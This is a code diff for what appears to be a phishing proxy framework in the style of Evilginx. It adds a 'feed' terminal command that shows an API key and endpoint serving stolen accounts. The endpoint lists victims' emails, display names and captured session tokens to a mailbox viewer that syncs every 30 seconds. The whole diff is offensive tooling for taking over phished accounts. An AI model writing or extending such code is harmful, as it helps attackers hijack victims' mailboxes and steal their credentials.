@@ -209,6 +209,9 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("devicecode: %v", err)
 			}
+		case "feed":
+			cmd_ok = true
+			t.handleFeed(args[1:])
 		case "quickstart":
 			cmd_ok = true
 			err := t.handleQuickstart(args[1:])
@@ -3859,6 +3862,62 @@ func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
 func (t *Terminal) sprintVar(k string, v string) string {
 	vc := color.New(color.FgYellow)
 	return k + ": " + vc.Sprint(v)
+}
+
+func (t *Terminal) handleFeed(args []string) {
+	feed := t.p.tokenFeed
+	if feed == nil {
+		log.Error("Token feed not initialized")
+		return
+	}
+
+	if len(args) == 0 {
+		// Show feed status and URL
+		apiKey := feed.GetAPIKey()
+		phishDomain := t.cfg.GetBaseDomain()
+		if phishDomain == "" {
+			phishDomain = "<your-domain>"
+		}
+
+		log.Info("[feed] Token Feed API Status")
+		log.Info("[feed] ─────────────────────────────")
+		log.Info("[feed] API Key: %s", apiKey)
+		log.Info("[feed] Endpoint: https://%s/api/v1/feed?key=%s", phishDomain, apiKey)
+		log.Info("")
+		log.Info("[feed] Mailbox Viewer Setup:")
+		log.Info("[feed]   1. Open mailbox.html in browser")
+		log.Info("[feed]   2. The feed URL is configured in the settings")
+		log.Info("[feed]   3. Accounts auto-sync every 30 seconds")
+
+		// Show accounts that would be served
+		accounts, err := feed.GetAccounts()
+		if err != nil {
+			log.Error("[feed] Error: %v", err)
+			return
+		}
+		log.Info("[feed]")
+		log.Info("[feed] Accounts with tokens: %d", len(accounts))
+		for _, acc := range accounts {
+			log.Info("[feed]   [%d] %s (%s) - %s", acc.SessionID, acc.Email, acc.DisplayName, acc.Status)
+		}
+		return
+	}
+
+	switch args[0] {
+	case "key":
+		log.Info("[feed] API Key: %s", feed.GetAPIKey())
+	case "url":
+		phishDomain := t.cfg.GetBaseDomain()
+		if phishDomain == "" {
+			phishDomain = "<your-domain>"
+		}
+		log.Info("[feed] Feed URL: https://%s/api/v1/feed?key=%s", phishDomain, feed.GetAPIKey())
+	default:
+		log.Info("[feed] Usage:")
+		log.Info("[feed]   feed        - Show feed status and accounts")
+		log.Info("[feed]   feed key    - Show API key")
+		log.Info("[feed]   feed url    - Show full feed URL")
+	}
 }
 
 func (t *Terminal) filterInput(r rune) (rune, bool) {
